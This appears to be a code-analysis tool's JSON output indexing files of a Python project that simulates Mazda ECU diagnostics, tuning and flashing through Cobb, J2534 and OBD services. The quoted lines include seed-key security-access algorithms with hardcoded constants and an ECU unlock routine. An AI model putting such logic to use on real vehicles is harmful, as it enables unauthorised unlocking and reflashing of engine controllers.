"import", "module": "CobbAccessPortEmulator", "line": null}, {"type": "import", "module": "HardwareInterface", "line": null}, {"type": "import", "module": "queue", "line": null}, {"type": "import", "module": "DiagnosticManager,", "line": null}], "components_found": [{"type": "class", "name": "CobbSecurityService", "line": 34}, {"type": "class", "name": "CobbJ2534Service", "line": 99}, {"type": "class", "name": "ECUMapService", "line": 145}, {"type": "class", "name": "HardwareEmulationService", "line": 160}, {"type": "class", "name": "HardwareInterfaceService", "line": 174}, {"type": "class", "name": "CobbOBDService", "line": 190}, {"type": "class", "name": "CobbFlashManager", "line": 201}, {"type": "class", "name": "RealTimeMonitorService", "line": 232}, {"type": "class", "name": "CobbCoordinator", "line": 249}], "algorithms": [{"type": "algorithm_function", "line": 45, "content": "def _seed_key_algorithm(self, seed: int) -> int:"}], "protocols": [{"type": "protocol", "line": 10, "protocol": "J2534", "content": "from cobb2 import J2534Protocol  # Real J2534 J2534Protocol wrapper"}, {"type": "protocol", "line": 12, "protocol": "J2534", "content": "J2534Protocol = None  # type: ignore[assignment]"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "ECU_TX_ID = 0x7E0"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "ECU_RX_ID = 0x7E8"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "TUNING_LEVEL = 0x07"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((seed >> 8) & 0xFF) ^ (seed & 0xFF)"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp * 0x201) & 0xFFFF"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= 0x8147"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x1A2B) & 0xFFFF"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((temp << 8) | (temp >> 8)) & 0xFFFF"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "return key ^ 0x55AA"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "self._seed_value = random.randint(0, 0xFFFF)"}, {"type": "protocol", "line": 99, "protocol": "J2534", "content": "class CobbJ2534Service:"}, {"type": "protocol", "line": 104, "protocol": "J2534", "content": "self.real: Optional[J2534Protocol] = ("}, {"type": "protocol", "line": 105, "protocol": "J2534", "content": "J2534Protocol() if \"J2534Protocol\" in globals() and J2534Protocol is not None else None"}, {"type": "protocol", "line": 109, "protocol": "J2534", "content": "\"\"\"Connect using the built-in simulated J2534 interface.\"\"\""}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "self.device_id = random.randint(1, 0xFFFF)"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "{\"id\": hex(random.randint(0x700, 0x7FF)), \"payload\": binascii.hexlify(random.randbytes(8)).decode()}"}, {"type": "protocol", "line": 136, "protocol": "J2534", "content": "\"\"\"Attempt to load a real J2534 driver DLL via cobb2.J2534Protocol."}, {"type": "protocol", "line": 148, "protocol": "0x[0-9A-Fa-f]+", "content": "\"boost_map\": {\"address\": 0x2000, \"size\": 128},"}, {"type": "protocol", "line": 149, "protocol": "0x[0-9A-Fa-f]+", "content": "\"fuel_map\": {\"address\": 0x2100, \"size\": 128},"}, {"type": "protocol", "line": 150, "protocol": "0x[0-9A-Fa-f]+", "content": "\"timing_map\": {\"address\": 0x2200, \"size\": 64},"}, {"type": "protocol", "line": 190, "protocol": "OBD", "content": "class CobbOBDService:"}, {"type": "protocol", "line": 252, "protocol": "J2534", "content": "self.j2534 = CobbJ2534Service()"}, {"type": "protocol", "line": 256, "protocol": "OBD", "content": "self.obd = CobbOBDService(DiagnosticManager(vin))"}], "hardware_assumptions": [{"type": "hardware", "line": 15, "hardware": "ECU", "content": "from cobb3 import MZRECU  # Reverse-engineered ECU model"}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "MZRECU = None  # type: ignore[assignment]"}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "class CobbSecurityService:"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "ECU_TX_ID = 0x7E0"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "ECU_RX_ID = 0x7E8"}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "self.security_level = 0"}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "self.security_level = min(self.security_level, level - 1)"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "self.security_level = level"}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "def unlock_ecu(self, target_level: int) -> bool:"}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "if self.session_active and self.security_level >= target_level:"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "for level in range(self.security_level + 1, target_level + 1):"}, {"type": "hardware", "line": 94, "hardware": "ECU", "content": "\"ECU_PN\": \"LFRE461BCD\","}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "class ECUMapService:"}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "def __init__(self, security: CobbSecurityService) -> None:"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "self.security = security"}, {"type": "hardware", "line": 206, "hardware": "ECU", "content": "if not self.security.session_active:"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "return {\"status\": \"locked\", \"message\": \"Unlock ECU first\"}"}, {"type": "hardware", "line": 251, "hardware": "ECU", "content": "self.security = CobbSecurityService()"}, {"type": "hardware", "line": 253, "hardware": "ECU", "content": "self.mapping = ECUMapService()"}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "self.flash = CobbFlashManager(self.security)"}, {"type": "hardware", "line": 261, "hardware": "ECU", "content": "self.ecu_model = MZRECU(self.security) if \"MZRECU\" in globals() and MZRECU is not None else None"}, {"type": "hardware", "line": 271, "hardware": "ECU", "content": "\"security_level\": str(self.security.security_level),"}, {"type": "hardware", "line": 272, "hardware": "ECU", "content": "\"session_active\": str(self.security.session_active),"}, {"type": "hardware", "line": 275, "hardware": "ECU", "content": "\"mzrecu_model\": \"yes\" if self.ecu_model is not None else \"no\","}], "security_logic": [{"type": "security_pattern", "line": 43, "pattern": "seed", "content": "self._seed_value = 0"}, {"type": "security_pattern", "line": 45, "pattern": "key", "content": "def _seed_key_algorithm(self, seed: int) -> int:"}, {"type": "security_pattern", "line": 45, "pattern": "seed", "content": "def _seed_key_algorithm(self, seed: int) -> int:"}, {"type": "security_pattern", "line": 45, "pattern": "algorithm", "content": "def _seed_key_algorithm(self, seed: int) -> int:"}, {"type": "security_pattern", "line": 46, "pattern": "seed", "content": "temp = ((seed >> 8) & 0xFF) ^ (seed & 0xFF)"}, {"type": "security_pattern", "line": 50, "pattern": "key", "content": "key = ((temp << 8) | (temp >> 8)) & 0xFFFF"}, {"type": "security_pattern", "line": 51, "pattern": "key", "content": "return key ^ 0x55AA"}, {"type": "security_pattern", "line": 53, "pattern": "seed", "content": "def request_seed(self, level: int) -> int:"}, {"type": "security_pattern", "line": 54, "pattern": "seed", "content": "self._seed_value = random.randint(0, 0xFFFF)"}, {"type": "security_pattern", "line": 56, "pattern": "seed", "content": "return self._seed_value"}, {"type": "security_pattern", "line": 58, "pattern": "key", "content": "def send_key(self, level: int, key: int) -> bool:"}, {"type": "security_pattern", "line": 59, "pattern": "key", "content": "expected = self._seed_key_algorithm(self._seed_value)"}, {"type": "security_pattern", "line": 59, "pattern": "seed", "content": "expected = self._seed_key_algorithm(self._seed_value)"}, {"type": "security_pattern", "line": 59, "pattern": "algorithm", "content": "expected = self._seed_key_algorithm(self._seed_value)"}, {"type": "security_pattern", "line": 60, "pattern": "key", "content": "if key == expected:"}, {"type": "security_pattern", "line": 70, "pattern": "seed", "content": "seed = self.request_seed(level)"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "key = self._seed_key_algorithm(seed)"}, {"type": "security_pattern", "line": 71, "pattern": "seed", "content": "key = self._seed_key_algorithm(seed)"}, {"type": "security_pattern", "line": 71, "pattern": "algorithm", "content": "key = self._seed_key_algorithm(seed)"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "if not self.send_key(level, key):"}, {"type": "security_pattern", "line": 154, "pattern": "key", "content": "return list(self.maps.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/comms_service.py", "lines_read": 85, "features_found": [{"type": "function", "name": "__init__", "line": 66}, {"type": "function", "name": "list_protocols", "line": 69}, {"type": "function", "name": "simulate_transaction", "line": 72}, {"type": "function", "name": "list_devices", "line": 76}, {"type": "function", "name": "toggle_device", "line": 79}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "List,", "line": null}], "components_found": [{"type": "class", "name": "CommunicationProtocol", "line": 9}, {"type": "class", "name": "J2534DeviceInfo", "line": 19}, {"type": "class", "name": "CommunicationService", "line": 26}], "algorithms": [], "protocols": [{"type": "protocol", "line": 19, "protocol": "J2534", "content": "class J2534DeviceInfo:"}, {"type": "protocol", "line": 29, "protocol": "CAN", "content": "name=\"ISO 15765-4 (CAN)\","}, {"type": "protocol", "line": 30, "protocol": "CAN", "content": "transport=\"ISO-TP over CAN\","}, {"type": "protocol", "line": 30, "protocol": "ISO-TP", "content": "transport=\"ISO-TP over CAN\","}, {"type": "protocol", "line": 31, "protocol": "ISO-TP", "content": "description=\"Standard Mazda diagnostic transport for UDS/ISO-TP traffic on 11-bit IDs.\","}, {"type": "protocol", "line": 31, "protocol": "UDS", "content": "description=\"Standard Mazda diagnostic transport for UDS/ISO-TP traffic on 11-bit IDs.\","}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "tx_id=\"0x7E0\","}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "rx_id=\"0x7E8\","}, {"type": "protocol", "line": 37, "protocol": "UDS", "content": "name=\"UDS (ISO 14229)\","}, {"type": "protocol", "line": 38, "protocol": "ISO-TP", "content": "transport=\"ISO-TP + Service IDs\","}, {"type": "protocol", "line": 39, "protocol": "ISO-TP", "content": "description=\"ECU configuration/diagnostic services built on ISO-TP (0x10,0x22,0x2E...).\","}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "description=\"ECU configuration/diagnostic services built on ISO-TP (0x10,0x22,0x2E...).\","}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "tx_id=\"0x7E0\","}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "rx_id=\"0x7E8\","}, {"type": "protocol", "line": 45, "protocol": "KWP", "content": "name=\"KWP2000 (Legacy)\","}, {"type": "protocol", "line": 46, "protocol": "ISO-TP", "content": "transport=\"KWP-over-ISO-TP\","}, {"type": "protocol", "line": 46, "protocol": "KWP", "content": "transport=\"KWP-over-ISO-TP\","}, {"type": "protocol", "line": 47, "protocol": "KWP", "content": "description=\"Mazda still exposes some services via KWP2000 for legacy modules.\","}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "request_example=\"21 01 (Read local ID 0x01)\","}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "tx_id=\"0x7DF\","}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "rx_id=\"0x7E8\","}, {"type": "protocol", "line": 54, "protocol": "J2534", "content": "DEVICES: List[J2534DeviceInfo] = ["}, {"type": "protocol", "line": 55, "protocol": "J2534", "content": "J2534DeviceInfo("}, {"type": "protocol", "line": 61, "protocol": "J2534", "content": "J2534DeviceInfo("}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "payload = random.randint(0, 0xFFFF)"}, {"type": "protocol", "line": 76, "protocol": "J2534", "content": "def list_devices(self) -> List[J2534DeviceInfo]:"}], "hardware_assumptions": [{"type": "hardware", "line": 39, "hardware": "ECU", "content": "description=\"ECU configuration/diagnostic services built on ISO-TP (0x10,0x22,0x2E...).\","}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/diagnostic_database.py", "lines_read": 69, "features_found": [{"type": "function", "name": "__init__", "line": 10}, {"type": "function", "name": "list_pids", "line": 13}, {"type": "function", "name": "list_dtcs", "line": 43}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "asdict", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "pids", "line": null}], "components_found": [{"type": "class", "name": "DiagnosticDatabaseService", "line": 9}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "src/muts/services/diagnostic_manager.py", "lines_read": 168, "features_found": [{"type": "function", "name": "__init__", "line": 13}, {"type": "function", "name": "scan_dtcs", "line": 18}, {"type": "function", "name": "clear_dtcs", "line": 50}, {"type": "function", "name": "list_dtcs", "line": 70}, {"type": "function", "name": "record_live_data", "line": 89}, {"type": "function", "name": "read_live_data", "line": 119}, {"type": "function", "name": "live_data", "line": 126}, {"type": "function", "name": "health_report", "line": 130}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "..storage", "line": null}, {"type": "import", "module": ".mazda_obd", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "get_connection,", "line": null}, {"type": "import", "module": "MazdaOBDService", "line": null}], "components_found": [{"type": "class", "name": "DiagnosticManager", "line": 12}], "algorithms": [], "protocols": [{"type": "protocol", "line": 7, "protocol": "OBD", "content": "from .mazda_obd import MazdaOBDService"}, {"type": "protocol", "line": 16, "protocol": "OBD", "content": "self._obd = MazdaOBDService()"}], "hardware_assumptions": [{"type": "hardware", "line": 6, "hardware": "vehicle", "content": "from ..storage import get_connection, ensure_demo_vehicle"}, {"type": "hardware", "line": 14, "hardware": "vehicle", "content": "ensure_demo_vehicle(vin)"}, {"type": "hardware", "line": 29, "hardware": "ECU", "content": "existing = conn.execute("}, {"type": "hardware", "line": 30, "hardware": "vehicle", "content": "\"SELECT id FROM trouble_codes WHERE vehicle_id = ? AND code = ? AND cleared_at IS NULL\","}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "conn.execute("}, {"type": "hardware", "line": 36, "hardware": "vehicle", "content": "\"INSERT INTO trouble_codes (vehicle_id, code, description, severity, detected_at) VALUES (?, ?, ?, ?"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "conn.execute("}, {"type": "hardware", "line": 62, "hardware": "vehicle", "content": "\"UPDATE trouble_codes SET cleared_at = ? WHERE vehicle_id = ? AND cleared_at IS NULL\","}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "rows = conn.execute("}, {"type": "hardware", "line": 73, "hardware": "vehicle", "content": "\"SELECT code, description, severity, detected_at, cleared_at FROM trouble_codes WHERE vehicle_id = ?"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "conn.execute("}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "\"\"\"INSERT INTO ecu_data ("}, {"type": "hardware", "line": 93, "hardware": "vehicle", "content": "vehicle_id, timestamp, rpm, boost_psi, throttle_position,"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "payload = self._obd.read_ecu_data()"}, {"type": "hardware", "line": 132, "hardware": "ECU", "content": "dtcs = conn.execute("}, {"type": "hardware", "line": 133, "hardware": "vehicle", "content": "\"SELECT code FROM trouble_codes WHERE vehicle_id = ? AND cleared_at IS NULL\","}, {"type": "hardware", "line": 136, "hardware": "ECU", "content": "recent = conn.execute("}, {"type": "hardware", "line": 137, "hardware": "ECU", "content": "\"SELECT boost_psi, knock_count FROM ecu_data WHERE vehicle_id = ? ORDER BY timestamp DESC LIMIT 100\""}, {"type": "hardware", "line": 137, "hardware": "vehicle", "content": "\"SELECT boost_psi, knock_count FROM ecu_data WHERE vehicle_id = ? ORDER BY timestamp DESC LIMIT 100\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "src/muts/services/diagnostics.py", "lines_read": 14, "features_found": [{"type": "function", "name": "__init__", "line": 6}, {"type": "function", "name": "read_dtcs", "line": 9}, {"type": "function", "name": "clear_dtcs", "line": 12}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".diagnostic_manager", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "DiagnosticManager", "line": null}], "components_found": [{"type": "class", "name": "DiagnosticsService", "line": 5}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "src/muts/services/dyno.py", "lines_read": 7, "features_found": [{"type": "function", "name": "virtual_pull", "line": 2}], "components_found": [{"type": "class", "name": "DynoService", "line": 1}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/integration_stack.py", "lines_read": 111, "features_found": [{"type": "function", "name": "__init__", "line": 54}, {"type": "function", "name": "stack_summaries", "line": 75}, {"type": "function", "name": "as_dict", "line": 103}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".cobb_stack", "line": null}, {"type": "import", "module": ".diagnostic_manager", "line": null}, {"type": "import", "module": ".diagnostics", "line": null}, {"type": "import", "module": ".dyno", "line": null}, {"type": "import", "module": ".mds_stack", "line": null}, {"type": "import", "module": ".mpsrom_stack", "line": null}, {"type": "import", "module": ".muts_stack", "line": null}, {"type": "import", "module": ".security", "line": null}, {"type": "import", "module": ".tune_library", "line": null}, {"type": "import", "module": ".torque_swas", "line": null}, {"type": "import", "module": ".versa_stack", "line": null}, {"type": "import", "module": ".comms_service", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "asdict,", "line": null}, {"type": "import", "module": "Any,", "line": null}, {"type": "import", "module": "CobbCoordinator", "line": null}, {"type": "import", "module": "DEFAULT_VIN", "line": null}, {"type": "import", "module": "DiagnosticsService", "line": null}, {"type": "import", "module": "DynoService", "line": null}, {"type": "import", "module": "MazdaIDSCoordinator", "line": null}, {"type": "import", "module": "MPSROMCoordinator", "line": null}, {"type": "import", "module": "MutsCoordinator", "line": null}, {"type": "import", "module": "SecurityService", "line": null}, {"type": "import", "module": "TuneLibraryService", "line": null}, {"type": "import", "module": "TorqueSWASService", "line": null}, {"type": "import", "module": "VersaCoordinator", "line": null}, {"type": "import", "module": "CommunicationService", "line": null}], "components_found": [{"type": "class", "name": "StackSummary", "line": 29}, {"type": "class", "name": "IntegrationCoordinator", "line": 46}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 7, "hardware": "ECU", "content": "security and dyno helpers. It is intentionally \"orchestration only\" \u2013 no"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "from .security import SecurityService"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "self.security = SecurityService()"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/mazda_obd.py", "lines_read": 57, "features_found": [{"type": "function", "name": "__init__", "line": 11}, {"type": "function", "name": "connect", "line": 15}, {"type": "function", "name": "disconnect", "line": 20}, {"type": "function", "name": "read_ecu_data", "line": 25}, {"type": "function", "name": "read_dtcs", "line": 46}, {"type": "function", "name": "clear_dtcs", "line": 55}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "MazdaOBDService", "line": 8}], "algorithms": [], "protocols": [{"type": "protocol", "line": 8, "protocol": "OBD", "content": "class MazdaOBDService:"}, {"type": "protocol", "line": 9, "protocol": "OBD", "content": "\"\"\"Simple simulator for Mazda OBD-II interactions.\"\"\""}], "hardware_assumptions": [{"type": "hardware", "line": 25, "hardware": "ECU", "content": "def read_ecu_data(self) -> Dict[str, float]:"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/mds_stack.py", "lines_read": 141, "features_found": [{"type": "function", "name": "__init__", "line": 36}, {"type": "function", "name": "solve", "line": 43}, {"type": "function", "name": "_solve_level1", "line": 47}, {"type": "function", "name": "_solve_level2", "line": 50}, {"type": "function", "name": "_solve_level3", "line": 54}, {"type": "function", "name": "run_test", "line": 73}, {"type": "function", "name": "__init__", "line": 87}, {"type": "function", "name": "list_maps", "line": 94}, {"type": "function", "name": "adjust_map", "line": 97}, {"type": "function", "name": "read_map", "line": 103}, {"type": "function", "name": "checksum", "line": 108}, {"type": "function", "name": "__init__", "line": 117}, {"type": "function", "name": "switch_protocol", "line": 126}, {"type": "function", "name": "enter_session", "line": 129}, {"type": "function", "name": "run_diagnostic_test", "line": 132}, {"type": "function", "name": "perform_calibration", "line": 135}, {"type": "function", "name": "calculate_checksum", "line": 138}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".diagnostic_manager", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "IntEnum,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "DiagnosticManager,", "line": null}], "components_found": [{"type": "class", "name": "MazdaProtocol", "line": 11}, {"type": "class", "name": "DiagnosticSession", "line": 21}, {"type": "class", "name": "SecurityAccessLevel", "line": 29}, {"type": "class", "name": "MazdaSeedKeyManager", "line": 35}, {"type": "class", "name": "DiagnosticTestStatus", "line": 59}, {"type": "class", "name": "MazdaDiagnosticTests", "line": 66}, {"type": "class", "name": "CalibrationOperationLevel", "line": 78}, {"type": "class", "name": "MazdaCalibrationService", "line": 86}, {"type": "class", "name": "MazdaChecksumCalculator", "line": 107}, {"type": "class", "name": "MazdaIDSCoordinator", "line": 116}], "algorithms": [{"type": "algorithm_function", "line": 108, "content": "def checksum(self, data: bytes, algorithm: str = \"crc32\") -> str:"}, {"type": "algorithm_function", "line": 138, "content": "def calculate_checksum(self, algorithm: str) -> str:"}], "protocols": [{"type": "protocol", "line": 13, "protocol": "KWP", "content": "ISO_14230_4_KWP = 2"}, {"type": "protocol", "line": 14, "protocol": "CAN", "content": "ISO_15765_4_CAN = 3"}, {"type": "protocol", "line": 15, "protocol": "CAN", "content": "ISO_15765_4_CAN_29 = 4"}, {"type": "protocol", "line": 16, "protocol": "CAN", "content": "MAZDA_CAN_HS = 5"}, {"type": "protocol", "line": 17, "protocol": "CAN", "content": "MAZDA_CAN_MS = 6"}, {"type": "protocol", "line": 18, "protocol": "CAN", "content": "MAZDA_SUB_CAN = 7"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "DEFAULT = 0x01"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "PROGRAMMING = 0x02"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "EXTENDED = 0x03"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "SAFETY = 0x04"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "MANUFACTURER = 0x40"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_1 = 0x01"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_2 = 0x02"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_3 = 0x03"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "return ((seed ^ 0x7382A91F) + 0x1F47A2B8) & 0xFFFFFFFF"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "key = seed ^ 0xA5C7E93D"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "return ((key << 7) | (key >> 25)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "key = seed ^ 0x1F4A7C3E"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "return ((key + 0x8D3A2F47) ^ 0xB5E8C91A) & 0xFFFFFFFF"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "return hex(struct.unpack(\">I\", struct.pack(\">I\", random.randint(0, 0xFFFFFFFF)))[0])"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "return hex(random.randint(0, 0xFFFF))"}, {"type": "protocol", "line": 113, "protocol": "0x[0-9A-Fa-f]+", "content": "return \"0x0\""}, {"type": "protocol", "line": 118, "protocol": "CAN", "content": "self.protocol = MazdaProtocol.ISO_15765_4_CAN"}], "hardware_assumptions": [{"type": "hardware", "line": 29, "hardware": "ECU", "content": "class SecurityAccessLevel(IntEnum):"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "SecurityAccessLevel.LEVEL_1: self._solve_level1,"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "SecurityAccessLevel.LEVEL_2: self._solve_level2,"}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "SecurityAccessLevel.LEVEL_3: self._solve_level3,"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "def solve(self, level: SecurityAccessLevel, seed: int) -> int:"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "self.security_manager = MazdaSeedKeyManager()"}], "security_logic": [{"type": "security_pattern", "line": 35, "pattern": "key", "content": "class MazdaSeedKeyManager:"}, {"type": "security_pattern", "line": 35, "pattern": "seed", "content": "class MazdaSeedKeyManager:"}, {"type": "security_pattern", "line": 37, "pattern": "algorithm", "content": "self.algorithms = {"}, {"type": "security_pattern", "line": 43, "pattern": "seed", "content": "def solve(self, level: SecurityAccessLevel, seed: int) -> int:"}, {"type": "security_pattern", "line": 44, "pattern": "algorithm", "content": "func = self.algorithms.get(level, self._solve_level1)"}, {"type": "security_pattern", "line": 45, "pattern": "seed", "content": "return func(seed)"}, {"type": "security_pattern", "line": 47, "pattern": "seed", "content": "def _solve_level1(self, seed: int) -> int:"}, {"type": "security_pattern", "line": 48, "pattern": "seed", "content": "return ((seed ^ 0x7382A91F) + 0x1F47A2B8) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 50, "pattern": "seed", "content": "def _solve_level2(self, seed: int) -> int:"}, {"type": "security_pattern", "line": 51, "pattern": "key", "content": "key = seed ^ 0xA5C7E93D"}, {"type": "security_pattern", "line": 51, "pattern": "seed", "content": "key = seed ^ 0xA5C7E93D"}, {"type": "security_pattern", "line": 52, "pattern": "key", "content": "return ((key << 7) | (key >> 25)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 54, "pattern": "seed", "content": "def _solve_level3(self, seed: int) -> int:"}, {"type": "security_pattern", "line": 55, "pattern": "key", "content": "key = seed ^ 0x1F4A7C3E"}, {"type": "security_pattern", "line": 55, "pattern": "seed", "content": "key = seed ^ 0x1F4A7C3E"}, {"type": "security_pattern", "line": 56, "pattern": "key", "content": "return ((key + 0x8D3A2F47) ^ 0xB5E8C91A) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 95, "pattern": "key", "content": "return list(self.maps.keys())"}, {"type": "security_pattern", "line": 108, "pattern": "algorithm", "content": "def checksum(self, data: bytes, algorithm: str = \"crc32\") -> str:"}, {"type": "security_pattern", "line": 109, "pattern": "algorithm", "content": "if algorithm == \"crc32\":"}, {"type": "security_pattern", "line": 111, "pattern": "algorithm", "content": "if algorithm == \"crc16\":"}, {"type": "security_pattern", "line": 120, "pattern": "key", "content": "self.security_manager = MazdaSeedKeyManager()"}, {"type": "security_pattern", "line": 120, "pattern": "seed", "content": "self.security_manager = MazdaSeedKeyManager()"}, {"type": "security_pattern", "line": 138, "pattern": "algorithm", "content": "def calculate_checksum(self, algorithm: str) -> str:"}, {"type": "security_pattern", "line": 140, "pattern": "algorithm", "content": "return self.checksum.checksum(data, algorithm)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
